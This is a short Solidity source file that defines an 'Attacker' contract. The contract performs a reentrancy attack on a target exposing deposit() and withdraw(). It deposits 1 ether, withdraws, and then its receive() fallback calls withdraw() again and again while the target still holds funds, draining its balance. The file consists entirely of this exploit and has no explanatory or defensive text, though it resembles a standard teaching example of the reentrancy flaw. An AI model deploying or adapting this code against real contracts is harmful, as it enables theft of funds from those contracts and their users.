// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public vulnerable;
    address public owner;

    constructor(address _vulnerable) {
        vulnerable = IVulnerable(_vulnerable);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(); // reenter again
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
